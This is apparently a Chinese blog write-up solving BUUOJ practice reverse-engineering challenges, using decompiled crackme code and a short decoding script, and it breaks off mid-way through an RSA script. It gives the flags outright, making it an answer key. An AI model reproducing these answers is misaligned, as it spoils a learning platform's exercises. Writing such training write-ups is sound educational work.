<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>BUUOJ 题库练习 | Lantern's 小站</title><meta name="author" content="Lantern"><meta name="copyright" content="Lantern"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BUUOJ的题库练习"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://lantern.cool/wp-games-buuctf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?c586340026fb7073260722fcc798b88b";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-165381350-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-165381350-1")</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"BUUOJ 题库练习",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2021-11-04 19:10:31"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Lantern's 小站" type="application/atom+xml"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/lantern.jpg" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">86</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>关于</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk/"><i class="fa-fw fas fa-cubes"></i> <span>自言自语</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png)"><nav id="nav"><span id="blog-info"><a href="/" title="Lantern's 小站"><span class="site-name">Lantern's 小站</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>关于</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk/"><i class="fa-fw fas fa-cubes"></i> <span>自言自语</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUOJ 题库练习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-10T11:29:31.000Z" title="发表于 2020-05-10 11:29:31">2020-05-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-11-04T19:10:31.000Z" title="更新于 2021-11-04 19:10:31">2021-11-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">39.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>226分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="BUUOJ 题库练习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>是北京联合大学的一个平台,题目有在更新,但是个人感觉题目难度很迷,不过是动态积分的方式,难度也可以看出来就是了。</p><p>Write Up持续更新, 有空就刷, 希望有一天能够刷穿题库</p><p>练习平台:<a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>IDA打开,main函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> a; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">  <span class="keyword">if</span> ( a == b )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;this_Is_a_EaSyRe&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry,you can&#x27;t get flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a>helloword</h3><p>jeb3打开,MainActivity:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method protected onCreate(Bundle)V</span><br><span class="line">          .registers 6</span><br><span class="line">00000000  invoke-super        ActionBarActivity-&gt;onCreate(Bundle)V, p0, p1</span><br><span class="line">00000006  const               v3, 0x7F030018</span><br><span class="line">0000000C  invoke-virtual      MainActivity-&gt;setContentView(I)V, p0, v3</span><br><span class="line">00000012  const-string        v0, &quot;flag&#123;7631a988259a00816deda84afb29430a&#125;&quot;</span><br><span class="line">00000016  const-string        v1, &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">0000001A  invoke-virtual      String-&gt;compareTo(String)I, v0, v1</span><br><span class="line">00000020  move-result         v2</span><br><span class="line">00000022  return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p>IDA打开,追踪字符串到主要函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1400118C0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+128h] [rbp+108h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">82</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = j_strlen(Str2);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( Str2[j] == <span class="number">111</span> )</span><br><span class="line">      Str2[j] = <span class="number">48</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1400111D1(<span class="string">&quot;input the flag:&quot;</span>);</span><br><span class="line">  sub_14001128F(<span class="string">&quot;%20s&quot;</span>, &amp;Str1);</span><br><span class="line">  v3 = j_strlen(Str2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;Str1, Str2, v3) )</span><br><span class="line">    sub_1400111D1(<span class="string">&quot;this is the right flag!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_1400111D1(<span class="string">&quot;wrong flag\n&quot;</span>);</span><br><span class="line">  sub_14001113B(&amp;v5, &amp;unk_140019D00);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看Str2:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:000000014001C000 Str2            db &#x27;&#123;hello_world&#125;&#x27;,0</span><br></pre></td></tr></table></figure><p>flag{hello_world}</p><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>IDA打开,主函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( pid )</span><br><span class="line">  &#123;</span><br><span class="line">    argv = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;stat_loc;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( flag[i] == <span class="string">&#x27;i&#x27;</span> || flag[i] == <span class="string">&#x27;r&#x27;</span> )</span><br><span class="line">        flag[i] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag:&quot;</span>, argv);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%20s&quot;</span>, &amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, &amp;s2) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;this is the right flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000601080 flag            db &#x27;&#123;&#x27;                  ; DATA XREF: main+34↑r</span><br><span class="line">.data:0000000000601080                                         ; main+44↑r ...</span><br><span class="line">.data:0000000000601081 aHackingForFun  db &#x27;hacking_for_fun&#125;&#x27;,0</span><br></pre></td></tr></table></figure><p>由于前面:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( flag[i] == <span class="string">&#x27;i&#x27;</span> || flag[i] == <span class="string">&#x27;r&#x27;</span> )</span><br><span class="line">        flag[i] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>so,最终flag为:</p><p>flag{hack1ng_fo1_fun}</p><h3 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h3><p>IDA打开,查看字符串发现base64 table表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:00407830 byte_407830     db 41h                  ; DATA XREF: sub_401000+C0↑r</span><br><span class="line">.rdata:00407831 aBcdefghijklmno db &#x27;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;,0</span><br></pre></td></tr></table></figure><p>整理一下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:00407830 aAbcdefghijklmn db &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span><br></pre></td></tr></table></figure><p>追到判断函数,根据经验修改类型和大小:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> key[<span class="number">11</span>]; <span class="comment">// [esp+8h] [ebp-20030h]</span></span><br><span class="line">  CHAR input[<span class="number">8</span>]; <span class="comment">// [esp+34h] [ebp-20004h]</span></span><br><span class="line">  CHAR v9; <span class="comment">// [esp+10034h] [ebp-10004h]</span></span><br><span class="line">  CHAR v10; <span class="comment">// [esp+10035h] [ebp-10003h]</span></span><br><span class="line">  CHAR v11; <span class="comment">// [esp+10036h] [ebp-10002h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, input, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      key[<span class="number">0</span>] = <span class="number">90</span>;</span><br><span class="line">      key[<span class="number">1</span>] = <span class="number">74</span>;</span><br><span class="line">      key[<span class="number">2</span>] = <span class="number">83</span>;</span><br><span class="line">      key[<span class="number">3</span>] = <span class="number">69</span>;</span><br><span class="line">      key[<span class="number">4</span>] = <span class="number">67</span>;</span><br><span class="line">      key[<span class="number">5</span>] = <span class="number">97</span>;</span><br><span class="line">      key[<span class="number">6</span>] = <span class="number">78</span>;</span><br><span class="line">      key[<span class="number">7</span>] = <span class="number">72</span>;</span><br><span class="line">      key[<span class="number">8</span>] = <span class="number">51</span>;</span><br><span class="line">      key[<span class="number">9</span>] = <span class="number">110</span>;</span><br><span class="line">      key[<span class="number">10</span>] = <span class="number">103</span>;</span><br><span class="line">      sub_4010F0(key, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v9, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v9 = input[<span class="number">5</span>];</span><br><span class="line">      v11 = input[<span class="number">7</span>];</span><br><span class="line">      v10 = input[<span class="number">6</span>];</span><br><span class="line">      v4 = base64((<span class="keyword">int</span>)&amp;v9, <span class="built_in">strlen</span>(&amp;v9));</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v9, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v10 = input[<span class="number">3</span>];</span><br><span class="line">      v9 = input[<span class="number">2</span>];</span><br><span class="line">      v11 = input[<span class="number">4</span>];</span><br><span class="line">      v5 = base64((<span class="keyword">int</span>)&amp;v9, <span class="built_in">strlen</span>(&amp;v9));</span><br><span class="line">      <span class="keyword">if</span> ( input[<span class="number">0</span>] == key[<span class="number">0</span>] + <span class="number">34</span></span><br><span class="line">        &amp;&amp; input[<span class="number">1</span>] == key[<span class="number">4</span>]</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * input[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * key[<span class="number">2</span>]</span><br><span class="line">        &amp;&amp; input[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (key[<span class="number">7</span>] / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, (<span class="keyword">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sub_4010F0(key, 0, 10):</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> num_10)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = num_10;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= num_10; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = i;</span><br><span class="line">    v6 = a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; a1[result] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          a1[v5] = a1[result];</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( a1[i] &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = i;</span><br><span class="line">          a1[result] = a1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    a1[result] = v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = num_10;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>研究一下就会发现是个从小到大的排序。</p><p>则解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s2 = base64.b64decode(<span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">s1 = base64.b64decode(<span class="string">&quot;V1Ax&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">11</span>) ]</span><br><span class="line"></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">90</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">74</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">83</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">69</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">67</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">97</span></span><br><span class="line">key[<span class="number">6</span>] = <span class="number">78</span></span><br><span class="line">key[<span class="number">7</span>] = <span class="number">72</span></span><br><span class="line">key[<span class="number">8</span>] = <span class="number">51</span></span><br><span class="line">key[<span class="number">9</span>] = <span class="number">110</span></span><br><span class="line">key[<span class="number">10</span>] = <span class="number">103</span></span><br><span class="line"></span><br><span class="line">key.sort()</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">chr</span>(key[<span class="number">0</span>] + <span class="number">34</span>) + <span class="built_in">chr</span>(key[<span class="number">4</span>]) + s1 + s2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{UJWP1jMp}</p><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>打开来两个文件,公钥密文都有,解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">cipher_text = message.read()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;pub.key&#x27;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">publickey = 